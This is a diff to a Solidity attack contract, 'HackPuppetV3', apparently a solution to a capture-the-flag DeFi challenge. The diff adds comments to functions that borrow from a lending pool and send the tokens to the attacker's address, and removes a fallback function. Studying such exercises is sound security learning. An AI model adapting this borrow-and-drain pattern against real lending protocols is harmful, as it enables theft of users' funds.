@@ -24,7 +24,7 @@ contract HackPuppetV3 is IUniswapV3SwapCallback {
     PuppetV3Pool lendingPool;
     address owner;
 
-    constructor(
+    constructor (
         IWETH _weth,
         IERC20 _token,
         IUniswapV3Pool _pool,
@@ -43,19 +43,24 @@ contract HackPuppetV3 is IUniswapV3SwapCallback {
     }
 
     function borrowAndTransfer(uint256 borrow) public {
+        // Approve the amount of weth, so the lending pool can transfer itself that weth amount
         weth.approve(address(lendingPool), weth.balanceOf(address(this)));
+        // Borrow the lending
         lendingPool.borrow(borrow);
+        // Transfer the whole tokens to player address
         token.transfer(owner, token.balanceOf(address(this)));
     }
 
+    // This function is necesary when calling the uniswapPool directly
+    // Usually is the router the one has this function and the one that calls the uniswapPool
     function uniswapV3SwapCallback(
         int256 amount0Delta,
         int256 amount1Delta,
         bytes calldata data
     ) external override {
         (address _token, address _pool) = abi.decode(data, (address, address));
+        // Transfer the token we're swaping for the one we're receiving
         IERC20(_token).transfer(_pool, uint256(amount1Delta));
     }
 
-    fallback() external payable {}
 }
